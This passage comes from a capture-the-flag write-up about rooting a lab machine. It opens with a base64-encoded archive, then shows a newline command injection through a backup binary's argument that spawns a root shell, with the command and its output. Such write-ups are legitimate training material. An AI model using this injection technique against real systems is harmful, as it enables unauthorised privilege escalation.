UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWZPT+2B1eAsAAQQAAAAABAAAAAAE4t81GPTCnYqcCzGSyZbXPduK38JSXVviph2VqJHS87POOw/KH/+ymQ58HxRQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="method-3-get-root-shell">Method-3 Get root shell</h1>
<p>If you try to do some command injection, itâ€™ll be probably be blocked by the binary.
But everything passed to zip binary is passed to system(). A newline in system will work just like it does in a Bash script, breaking commands.
I can try passing the <code class="language-plaintext highlighter-rouge">\n</code>, using single or double quotes and then giving a new line, then completing the quote.
That <code class="language-plaintext highlighter-rouge">bash #</code> is taken from <a href="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup <span class="nt">-q</span> <span class="s2">""</span> <span class="s2">"
bash #"</span>
root@node:/tmp# <span class="nb">whoami
</span>root
</pre></td></tr></tbody></table></code></pre></div></div>
:ET